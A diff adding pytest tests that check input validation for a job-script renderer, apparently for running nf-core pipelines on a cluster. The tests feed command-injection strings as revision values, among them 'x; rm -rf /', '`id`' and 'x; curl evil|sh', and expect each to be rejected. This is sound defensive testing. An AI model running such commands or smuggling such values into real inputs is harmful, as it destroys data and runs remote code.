@@ -1,3 +1,5 @@
+import pytest
+
 from chat_nextseek.luria.run_script import (
     validate_resources,
     sanitize_job_name,
@@ -47,3 +49,22 @@ def test_render_substitutes_all_slots_and_no_tokens_left():
     assert "-w /net/x/work/nfcore_rnaseq" in script
     assert "export NXF_SINGULARITY_CACHEDIR=/net/x/singularity_cache" in script
     assert "{{" not in script and "}}" not in script
+
+
+def test_validate_revision_accepts_normal_revisions():
+    from chat_nextseek.luria.run_script import validate_revision
+    for r in ("3.21.0", "main", "a1b2c3d", "dev/branch-1"):
+        assert validate_revision(r) == r
+
+
+def test_validate_revision_rejects_shell_metacharacters():
+    from chat_nextseek.luria.run_script import validate_revision
+    for bad in ("x; rm -rf /", "main | sh", "v1 -c /tmp/e.config", "a\nb", "`id`"):
+        with pytest.raises(ValueError):
+            validate_revision(bad)
+
+
+def test_render_run_script_rejects_injected_revision():
+    with pytest.raises(ValueError):
+        render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="x; curl evil|sh",
+                          work_dir="/w", singularity_cache="/c", resources={})
